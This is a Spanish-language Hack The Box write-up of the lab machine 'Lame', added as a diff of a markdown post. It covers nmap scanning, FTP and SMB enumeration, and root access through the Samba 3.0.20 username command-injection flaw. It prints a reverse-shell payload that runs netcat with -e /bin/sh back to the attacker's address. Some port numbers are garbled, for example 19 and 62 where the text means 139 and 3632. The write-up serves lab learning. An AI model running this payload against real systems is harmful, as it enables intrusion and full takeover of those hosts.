@@ -1,0 +1,157 @@
+---
+title: Lame
+date: '2023-07-07'
+lastmod: '2023-08-05'
+tags: ['labs', 'HackTheBox']
+draft: false
+summary: 'Lame is a beginner-level machine that only requires one exploit to gain root access. It was the first machine published on Hack The Box and is often the first machine for new users.'
+images: ['/static/images/htb/lame/Lame.png']
+---
+
+![Portada](/static/images/htb/Lame/Lame.png)
+
+# [CHECK OUT THE VIDEO TUTORIAL](https://www.youtube.com/watch?v=qDNVy6n9Jds)
+
+<TOCInline toc={props.toc} exclude="Introduccion" />
+
+## RECONNAISANCE
+
+### Ping
+
+First of all, we verify that we are on the same network as the victim machine by sending a data packet to the IP 10.10.10.3 using the ping command.
+
+```js
+  ping -c 4 10.10.10.3
+```
+
+- `-c` : Number of ICMP (Internet Control Message Protocol) echo request packets that will be sent.
+
+![Ping](/static/images/htb/Lame/ping.png)
+
+### Nmap
+
+Then, we perform the port scan.
+
+```js
+  nmap -p- --open 10.10.10.3 -Pn
+```
+
+- `-p-` : Escanea todos los puertos.
+- `--open` : Solo va a reportar los puertos que encuentre abiertos.
+- `-Pn` : Realiza el escaneo incluso si el dispositivo no responde a los pings.
+
+![Nmap1](/static/images/htb/Lame/nmap1.png)
+
+Al obtener la lista de los puertos abiertos en la maquina victima,realizamos otro escaneo pero solo a los que
+nmap reporto como abiertos incluyendo las siguientes flags:
+
+- `-sC` : Activa el escaneo utilizando scripts de enumeración y detección de servicios predeterminados. Los scripts se ejecutan contra los puertos abiertos para obtener información adicional sobre los servicios en ejecución.
+- `-sV` : Realiza una detección de versión de los servicios que se encuentran en los puertos abiertos. Nmap intenta determinar la versión y el tipo de servicio utilizando diversos métodos, como el envío de solicitudes específicas y la comparación de las respuestas recibidas.
+- `-p` : Especifica los puertos que se escanearán. En este caso, se están escaneando los puertos 21 (FTP), 22 (SSH), 139 (NetBIOS/SMB), 445 (SMB) y 3632 (distccd).
+- `-Pn` : Indica a Nmap que realice el escaneo incluso si el dispositivo no responde a los pings. Esto puede ser útil cuando el dispositivo tiene configuraciones de firewall que bloquean los paquetes ICMP de solicitud de eco.
+
+```js
+  nmap -sC -sV -p21,22,19,445,62 10.10.10.3 -Pn
+```
+
+![Nmap2](/static/images/htb/Lame/nmap2.png)
+
+### Puertos abiertos
+
+| Puertos abiertos | Servicio    | Version              |
+| ---------------- | ----------- | -------------------- |
+| **_21/tcp_**     | ftp         | vsftpd 2.3.4         |
+| **_22/tcp_**     | SSH         | Open SSH 4.7p1       |
+| **_139/tcp_**    | netbios-ssn | Samba smbd 3.x - 4.x |
+| **_445/tcp_**    | netbios-ssn | Samba smbd 3.0.20    |
+| **_3632/tcp_**   | distccd     | distccd v1           |
+
+## ENUMERACION
+
+### Puerto 21 - FTP
+
+El puerto 21 se utiliza comúnmente para el protocolo FTP (File Transfer Protocol), que es un protocolo estándar para la transferencia de archivos entre sistemas informáticos en una red. El protocolo FTP permite a los usuarios transferir archivos de un equipo a otro a través de una red. El puerto 21 se utiliza para establecer la conexión de control entre el cliente FTP y el servidor FTP. En esta conexión, el cliente envía comandos al servidor para solicitar operaciones como la autenticación del usuario, listar archivos en el servidor, crear directorios, descargar o subir archivos, entre otros. Es importante tener en cuenta que el protocolo FTP es un protocolo no seguro, ya que la información se transmite en texto plano, incluyendo las credenciales de inicio de sesión.
+
+Al realizar una busqueda por google, encontramos que la `version 2.3.4` tiene una vulnerabilidad [CVE 2011-2523](https://www.exploit-db.com/exploits/49757).
+
+![Exploit](/static/images/htb/Lame/exploit1.png)
+
+Como se ve en el script, al aplicar el “:)” en el nombre del usuario y poner una contraseña cualquiera, se abriria el puerto 6200.
+Pero, al tratar de realizar estos pasos y luego confirnar con nmap si el puerto 62000 esta abierto, nos reporta que esta filtrado. Por ende, no es vulnerable a esta accion.
+
+En el reconocimiento con nmap, hallamos que el inicio de sesion anonimo estaba disponible, pero al ingresar vemos que el directorio esta vacio.
+
+![Ftp](/static/images/htb/Lame/ftp.png)
+
+### Puerto 22 - SSH
+
+Como no tengo credenciales validas, continuo al siguiente puerto abierto.
+
+### Puertos 139 - 445 - Samba (SMB)
+
+SMB es un protocolo de red utilizado para compartir archivos, impresoras y otros recursos entre computadoras en una red. Se encuentra comúnmente en sistemas operativos basados en Unix y Linux, y se utiliza para establecer una conexión con un servidor SMB, explorar recursos compartidos, listar archivos y directorios, transferir archivos entre el cliente y el servidor, y ejecutar comandos remotos en el servidor SMB.
+
+Para acceder a este servidor utilizamos `smbclient`. Al usar smbclient, puedes autenticarte en un servidor SMB proporcionando un nombre de usuario y una contraseña válidos. Una vez que hayas establecido una conexión con el servidor, puedes utilizar comandos similares a los de una interfaz de línea de comandos para interactuar con los recursos compartidos, como copiar archivos, eliminar archivos, crear directorios, obtener información sobre archivos y más.
+
+```js
+  smbclient -L 10.10.10.3
+```
+
+El comando "smbclient -L 10.10.10.3" se utiliza para enumerar los recursos compartidos disponibles en un servidor SMB específico.
+
+Cuando ejecutas este comando, smbclient establece una conexión con el servidor SMB y solicita la lista de recursos compartidos disponibles en ese servidor.
+Esto puede incluir carpetas compartidas, impresoras compartidas u otros recursos que estén configurados para compartir a través del protocolo SMB en el servidor.
+
+![Ftp](/static/images/htb/Lame/smb1.png)
+
+Con `smbmap` vemos los permisos en los dispositivos compartidos.
+
+```js
+  smbmap -H 10.10.10.3
+```
+
+![Ftp](/static/images/htb/Lame/smb2.png)
+
+En la carpeta `tmp` tenemos permisos de lectura y escritura.
+
+Vamos a buscar en searchsploit si esta version de smb tiene alguna vulnerabilidad conocida.
+
+![Exploit](/static/images/htb/Lame/exploit.png)
+
+Con el comando `searchsploit -x 16320.rn` podemos ver el codigo y entender que ocurre por detras o en google podemos verlo en [Exploit Database](https://www.exploit-db.com/) como [CVE 2007-2447](https://www.exploit-db.com/exploits/16320)
+
+La parte mas importante del script esta aqui, al ingresar el nombre de usuario y pasarle el comando nohup ,seguido de un payload, le vamos a ingresar una reverse shell para que la maquina victima se conecte a la nuestra.
+
+![Exploit](/static/images/htb/Lame/exploit2.png)
+
+> En Linux, el comando nohup se utiliza para ejecutar un programa o script de manera persistente, incluso después de cerrar la terminal o sesión de inicio de sesión.
+
+## EXPLOTACION
+
+En nuestra maquina local vamos a ejecutar el comando `nc -nlvp 4646`.
+
+Esto crea un listener en el puerto 4646 de la máquina local, lo que significa que Netcat estará a la espera de conexiones entrantes en ese puerto. Esto es útil para establecer una conexión de red entre dos máquinas y permitir que una de ellas actúe como servidor o receptor de datos en el puerto especificado.
+
+- `-n`: Indica a Netcat que no realice la resolución inversa de las direcciones IP o nombres de host.
+- `-l`: Activa el modo de escucha, permitiendo que Netcat escuche conexiones entrantes en lugar de iniciar una conexión saliente.
+- `-v`: Habilita el modo verboose (detallado) y muestra información adicional sobre las conexiones entrantes y salientes.
+- `-p 4646`: Especifica el número de puerto en el que Netcat debe escuchar las conexiones entrantes. En este caso, el puerto elegido es el 4646.
+
+Por otro lado, cuando nos conectemos por ftp a la maquina victima y estemos dentro, usaremos el comando logon para autenticarnos y aprovecharemos de la vulnerabilidad antes mencionada pasndole como usuario:
+
+```js
+'/=`nohup nc -nv 10.10.14.10 4646 -e /bin/sh`'
+```
+
+El comando `nc -nv 10.10.14.10 4646 -e /bin/sh` utiliza la herramienta Netcat (nc) para establecer una conexión de red con la dirección IP `10.10.14.10` en el puerto 4646 y ejecutar el shell `(/bin/sh)` en el sistema remoto:
+
+- `-n`: Esta opción indica a Netcat que no realice la resolución inversa de las direcciones IP o nombres de host.
+- `-v`: Esta opción habilita el modo verbose (detallado) y muestra información adicional sobre las conexiones entrantes y salientes.
+- `10.10.14.10`: Es la dirección IP del sistema remoto al que se desea conectarse.
+- `4646`: Es el número de puerto en el que se establecerá la conexión.
+- `-e /bin/sh`: Especifica el comando que se ejecutará en el sistema remoto una vez que se establezca la conexión. En este caso, se ejecutará el shell ("/bin/sh"), lo que nos va a proporcionar una interfaz de línea de comandos en el sistema remoto.
+
+![Explotacion](/static/images/htb/Lame/explotacion.png)
+
+Una vez dentro, vemos que somos el usuario privilegiado root y vamos por las banderas user.txt y root.txt.
+![Fin](/static/images/htb/Lame/fin.png)
